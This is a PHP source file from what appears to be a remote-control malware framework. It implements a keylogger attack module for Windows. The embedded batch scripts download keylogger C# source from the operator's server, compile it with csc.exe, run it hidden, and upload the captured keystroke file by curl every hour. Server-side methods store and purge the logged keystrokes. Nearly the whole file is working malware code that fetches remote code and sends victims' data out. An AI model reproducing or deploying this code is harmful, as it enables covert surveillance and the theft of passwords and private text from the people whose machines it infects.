<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard;

use Kelvinho\Virus\Attack\AttackBase;

/**
 * Class MonitorKeyboard. Monitors key strokes 24/7, but reports once in a while. Currently it is set to half an hour.
 *
 * Structure of an event saved on disk:
 * events => {
 *   "{unix time}" => "{name}"
 * }
 * And saved events are just a single unix timestamp, and all information is stored in events
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class MonitorKeyboard extends AttackBase {
    /** @var array<int, string>, array of unix timestamp => name */
    private array $events = [];
    /** @var array<int>, array of unix timestamps */
    private array $savedEvents = [];

    public function getEvents(): array {
        return $this->events;
    }

    public function saveEventFromIntercept(int $unixTime) {
        $this->events[$unixTime] = "";
    }

    public function updateEventFromController(string $jsonEvent, string $unixTime): MonitorKeyboard {
        $event = json_decode($jsonEvent, true);
        $this->events[$unixTime] = $event["name"];
        return $this;
    }

    public function getSavedEvents(): array {
        return $this->savedEvents;
    }

    public function setSavedEvents(string $jsonSavedEvents): MonitorKeyboard {
        $this->savedEvents = json_decode($jsonSavedEvents, true);
        return $this;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        timeout 60
        @echo off
        if not exist "%~pd0..\..\utils\kl.exe" (
            >"%~pd0install.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/install\n"; ?>
            start /wait /b /d "%~pd0" install.cmd
            rem del install.cmd
        )
        if not exist "%~pd0..\..\utils\kl.exe" exit /b 0
        call :getSize "%~pd0..\..\utils\kl.exe"
        if %size% leq 0 (
            del "%~pd0..\..\utils\kl.exe"
            exit /b 0
        )

        >"%~pd0ks.txt" type nul
        >"%~pd0run.cmd" echo "%~pd0..\..\utils\kl.exe" "%~pd0ks.txt"
        start /b cmd.exe /c "%~pd0run.cmd"

        :daemon_loop
        curl --form "ks=@%~pd0ks.txt" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report\n"; ?>
        >"%~pd0ks.txtd" type nul
        timeout 3600
        goto daemon_loop
        exit /b 0

        :getSize
        set /A size=%~z1
        exit /b 0
        <?php
        //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
        switch ($resourceIdentifier) {
            case "code":
                readfile(__DIR__ . "/resources/keylogger.cs");
                break;
            case "install": //@formatter:off ?>
@echo off
SetLocal

>"%~pd0code" curl -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/code\n"; ?>

:: find csc.exe
set "csc="
for /r "%SystemRoot%\Microsoft.NET\Framework\" %%# in ("*csc.exe") do  set "csc=%%#"

if not exist "%csc%" (
    echo no .net framework installed
    exit /b 10
)

if not exist "%~n0.exe" (
    call %csc% /nologo /r:"Microsoft.VisualBasic.dll" /out:"%~pd0kl.exe" "%~pd0code" || (
        exit /b %errorlevel%
    )
)
move "%~pd0kl.exe" "%~pd0..\..\utils\kl.exe"
            <?php break; //@formatter:on
            default:
        }
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->events = $state["events"] ?? [];
        $this->savedEvents = $state["savedEvents"] ?? [];
        asort($this->savedEvents);
    }

    protected function getState(): string {
        $state = [];
        $state["events"] = $this->events;
        $state["savedEvents"] = $this->savedEvents;
        return json_encode($state);
    }

    public function purgeEvents() {
        foreach ($this->events as $unixTime => $name) {
            if (in_array($unixTime, $this->savedEvents)) continue;
            if (time() - $unixTime > 24 * 60 * 60) {
                unset($this->events[$unixTime]);
                $filePath = DATA_FILE . "/attacks/" . $this->getAttackId() . "/keys-$unixTime.txt";
                $this->resetStaticUsage();
                $this->usage()->minusDisk(filesize($filePath))->saveState();
                $this->reportStaticUsage();
                unlink($filePath);
            }
        }
    }
}
